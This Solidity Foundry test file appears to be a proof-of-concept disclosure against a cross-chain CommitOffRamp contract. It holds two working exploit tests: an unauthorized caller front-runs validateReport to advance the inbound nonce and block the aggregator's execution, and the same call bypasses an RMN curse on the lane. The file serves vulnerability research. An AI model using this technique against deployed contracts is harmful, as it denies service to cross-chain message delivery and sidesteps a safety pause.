// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";

import {BaseTest} from "../../BaseTest.t.sol";

import {NonceManager} from "../../../NonceManager.sol";
import {CommitOffRamp} from "../../../offRamp/CommitOffRamp.sol";
import {CCVAggregator} from "../../../offRamp/CCVAggregator.sol";
import {IRMNRemote} from "../../../interfaces/IRMNRemote.sol";
import {SignatureQuorumVerifier} from "../../../ocr/SignatureQuorumVerifier.sol";
import {Internal} from "../../../libraries/Internal.sol";
import {CCVAggregatorHelper} from "../../helpers/CCVAggregatorHelper.sol";
import {MockReceiverV2} from "../../mocks/MockReceiverV2.sol";
import {AuthorizedCallers} from "@chainlink/contracts/src/v0.8/shared/access/AuthorizedCallers.sol";

contract CommitOffRamp_ValidateReport_POC is BaseTest {
  // signer private keys used for signature quorum (two signers, F=1)
  uint256 internal constant PRIV0 = 0x7b2e97fe057e6de99d6872a2ef2abf52c9b4469bc848c2465ac3fcd8d336e81d;
  uint256 internal constant PRIV1 = PRIV0 + 1;

  NonceManager internal s_nonceManager;
  CommitOffRamp internal s_commit;
  CCVAggregatorHelper internal s_agg;
  MockReceiverV2 internal s_receiver;

  bytes32 internal s_configDigest;
  address[] internal s_signers;
  uint256[] internal s_signerKeys;

  function setUp() public virtual override {
    BaseTest.setUp();

    // Deploy NonceManager with no authorized callers initially
    s_nonceManager = new NonceManager(new address[](0));

    // Deploy CommitOffRamp and authorize it in NonceManager
    s_commit = new CommitOffRamp(address(s_nonceManager));

    address[] memory authorizedCallers = new address[](1);
    authorizedCallers[0] = address(s_commit);
    s_nonceManager.applyAuthorizedCallerUpdates(
      AuthorizedCallers.AuthorizedCallerArgs({addedCallers: authorizedCallers, removedCallers: new address[](0)})
    );

    // Configure CCV signer set on CommitOffRamp (F=1 -> need 2 signatures)
    s_signers = new address[](2);
    s_signers[0] = vm.addr(PRIV0);
    s_signers[1] = vm.addr(PRIV1);
    s_signerKeys = new uint256[](2);
    s_signerKeys[0] = PRIV0;
    s_signerKeys[1] = PRIV1;
    s_configDigest = keccak256(abi.encode("POC_CONFIG_DIGEST"));

    SignatureQuorumVerifier.SignatureConfigArgs[] memory configs =
      new SignatureQuorumVerifier.SignatureConfigArgs[](1);
    configs[0] = SignatureQuorumVerifier.SignatureConfigArgs({configDigest: s_configDigest, F: 1, signers: s_signers});
    s_commit.setSignatureConfigs(configs);

    // Deploy Aggregator with our RMN mock and configure default CCV to CommitOffRamp
    s_agg = new CCVAggregatorHelper(
      CCVAggregator.StaticConfig({
        localChainSelector: DEST_CHAIN_SELECTOR,
        gasForCallExactCheck: GAS_FOR_CALL_EXACT_CHECK,
        rmnRemote: s_mockRMNRemote,
        tokenAdminRegistry: makeAddr("tokenAdminRegistry")
      })
    );

    address[] memory defaultCCVs = new address[](1);
    defaultCCVs[0] = address(s_commit);

    CCVAggregator.SourceChainConfigArgs[] memory updates = new CCVAggregator.SourceChainConfigArgs[](1);
    updates[0] = CCVAggregator.SourceChainConfigArgs({
      router: s_destRouter,
      sourceChainSelector: SOURCE_CHAIN_SELECTOR,
      isEnabled: true,
      onRamp: abi.encode(makeAddr("onRamp")),
      defaultCCV: defaultCCVs,
      laneMandatedCCVs: new address[](0)
    });
    s_agg.applySourceChainConfigUpdates(updates);

    // Receiver supports IAny2EVMMessageReceiver and V2; returns no CCVs, causing fallback to defaultCCVs
    s_receiver = new MockReceiverV2(new address[](0), new address[](0), 0);
  }

  function _buildMessage(uint64 seqNr) internal view returns (Internal.Any2EVMMessage memory msg_) {
    Internal.TokenTransfer[] memory tokenAmounts = new Internal.TokenTransfer[](0); // no tokens
    msg_ = Internal.Any2EVMMessage({
      header: Internal.Header({
        messageId: bytes32(0),
        sourceChainSelector: SOURCE_CHAIN_SELECTOR,
        destChainSelector: DEST_CHAIN_SELECTOR,
        sequenceNumber: seqNr
      }),
      sender: abi.encode(OWNER),
      data: hex"",
      receiver: address(s_receiver),
      gasLimit: GAS_LIMIT,
      tokenAmounts: tokenAmounts
    });
  }

  function _encodeSignatureProof(bytes32 reportHash)
    internal
    view
    returns (bytes memory signatureProof)
  {
    // Create signatures and order them by recovered signer address (strictly increasing)
    bytes32[] memory rs = new bytes32[](s_signerKeys.length);
    bytes32[] memory ss = new bytes32[](s_signerKeys.length);
    address[] memory signersRecovered = new address[](s_signerKeys.length);
    for (uint256 i = 0; i < s_signerKeys.length; ++i) {
      (uint8 v, bytes32 r, bytes32 s) = vm.sign(s_signerKeys[i], reportHash);
      // v is ignored by on-chain validation; always treated as 27
      v; // silence linter
      rs[i] = r;
      ss[i] = s;
      signersRecovered[i] = vm.addr(s_signerKeys[i]);
    }

    // simple bubble sort for 2 elements to ensure ascending by address
    if (uint160(signersRecovered[0]) > uint160(signersRecovered[1])) {
      (rs[0], rs[1]) = (rs[1], rs[0]);
      (ss[0], ss[1]) = (ss[1], ss[0]);
      (signersRecovered[0], signersRecovered[1]) = (signersRecovered[1], signersRecovered[0]);
    }

    signatureProof = abi.encode(SignatureQuorumVerifier.SignatureProof({rs: rs, ss: ss}));
  }

  function _buildCCVData(bytes32 messageHash, uint64 nonce)
    internal
    view
    returns (bytes memory ccvData)
  {
    bytes memory ccvArgs = abi.encode(s_configDigest, nonce);
    bytes32 reportHash = keccak256(abi.encode(messageHash, keccak256(ccvArgs)));
    bytes memory signatures = _encodeSignatureProof(reportHash);
    ccvData = abi.encode(ccvArgs, signatures);
  }

  function _buildAggregatedReport(Internal.Any2EVMMessage memory message, bytes memory ccvData)
    internal
    view
    returns (CCVAggregator.AggregatedReport memory report)
  {
    address[] memory ccvs = new address[](1);
    ccvs[0] = address(s_commit);
    bytes[] memory ccvDatas = new bytes[](1);
    ccvDatas[0] = ccvData;
    report = CCVAggregator.AggregatedReport({message: message, ccvs: ccvs, ccvData: ccvDatas});
  }

  // POC 1: Mempool front-runner DoS by pre-incrementing inbound nonce via CommitOffRamp.validateReport
  function test_FrontrunNonceAdvance_BricksAggregatorExecute() public {
    // Prepare message and CCV data with expected nonce = 1
    Internal.Any2EVMMessage memory message = _buildMessage(1);
    bytes32 messageHash = keccak256(abi.encode(message));
    bytes memory ccvData = _buildCCVData(messageHash, 1);

    // Attacker front-runs using the exact CCV data from the aggregator tx
    vm.prank(STRANGER);
    s_commit.validateReport({
      message: message,
      messageHash: messageHash,
      ccvData: ccvData,
      originalState: Internal.MessageExecutionState.UNTOUCHED
    });

    // Inbound nonce should now be incremented to 1 for (SOURCE_CHAIN_SELECTOR, OWNER)
    assertEq(s_nonceManager.getInboundNonce(SOURCE_CHAIN_SELECTOR, abi.encode(OWNER)), 1);

    // Now the aggregator attempts to execute with the same CCV data -> validateReport reverts InvalidNonce
    CCVAggregator.AggregatedReport memory report = _buildAggregatedReport(message, ccvData);

    vm.expectRevert(abi.encodeWithSelector(CommitOffRamp.InvalidNonce.selector, uint64(1)));
    s_agg.execute(report);

    // Nonce remains 1
    assertEq(s_nonceManager.getInboundNonce(SOURCE_CHAIN_SELECTOR, abi.encode(OWNER)), 1);
  }

  // POC 2: RMN curse bypass - validateReport increments nonce while lane is cursed and aggregator is blocked
  function test_Curse_Bypass_And_NonceAdvance() public {
    // Curse the lane at RMN (aggregator checks this and reverts)
    _setMockRMNChainCurse(SOURCE_CHAIN_SELECTOR, true);

    Internal.Any2EVMMessage memory message = _buildMessage(1);
    bytes32 messageHash = keccak256(abi.encode(message));
    bytes memory ccvData = _buildCCVData(messageHash, 1);
    CCVAggregator.AggregatedReport memory report = _buildAggregatedReport(message, ccvData);

    // Aggregator blocked by curse
    vm.expectRevert(abi.encodeWithSelector(CCVAggregator.CursedByRMN.selector, SOURCE_CHAIN_SELECTOR));
    s_agg.execute(report);

    // Attacker can still call validateReport and advance inbound nonce to 1
    vm.prank(STRANGER);
    s_commit.validateReport({
      message: message,
      messageHash: messageHash,
      ccvData: ccvData,
      originalState: Internal.MessageExecutionState.UNTOUCHED
    });
    assertEq(s_nonceManager.getInboundNonce(SOURCE_CHAIN_SELECTOR, abi.encode(OWNER)), 1);

    // After curse is lifted, aggregator now reverts due to nonce mismatch (InvalidNonce bubbled up)
    _setMockRMNChainCurse(SOURCE_CHAIN_SELECTOR, false);
    vm.expectRevert(abi.encodeWithSelector(CommitOffRamp.InvalidNonce.selector, uint64(1)));
    s_agg.execute(report);
  }
}

